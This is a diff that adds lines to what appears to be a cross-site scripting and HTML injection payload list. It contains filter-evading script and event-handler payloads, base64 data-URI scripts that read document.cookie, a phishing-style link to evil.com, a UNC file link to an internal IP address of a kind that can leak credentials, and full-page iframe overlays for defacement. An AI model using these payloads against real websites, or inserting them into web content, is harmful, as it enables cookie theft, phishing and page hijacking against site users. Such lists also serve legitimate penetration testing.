@@ -1,9 +1,21 @@
 <h1>Hello,<script>alert(1)</script>!</h1>
+<img/src/onerror=.1|alert(document.domain)>
+"onfocus="prompt(document.cookie)"autofocus="
+<a href=http://evil.com>sumit your report here </a>
+<video src=1 href=1 onerror= "javascript:alert(document.domain)"></video>
+"><iframe src="Http://Www.Bing.com" style="Height:300p: Width:300px">
+<marquee>hello</marquee>
+<iframe\src='https://www.bing.com'>
+"><Script>Alert(Document.Cookie)<S
+<h1><font color=red>Visit Our New Website </h1> <h3><mark><a href="https://example.com">example.com</a></mark></h3>
+"> <iframe src="javascript:alert(document.domain);"> </iframe>
+<a href="file:///\\10.10.111.111\test\test.rtf!something">CLICK ME</a>
 <script src="data:text/html;base64,YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="></script>
 <script src=data:text/html;base64,YWxlcnQoZG9jdW1lbnQuY29va2llKQ==></script>
 <script src=data:text/html;,alert(document.cookie)></script>
 <script src=data:text/html,alert(document.cookie)></script>
 <script src=data:,alert(document.cookie)></script>
+"><iframe src="https://www.cia.gov/" style="border: 0; position:fixed; top:0; left:0; right:0; bottom:0; width: 100%; height:100%">
 <script src="data:text/html;base64,YWxlcnQoMSk="></script>
 <script src=data:text/html;base64,YWxlcnQoMSk=></script>
 <script src=data:text/html;,alert(1)></script>
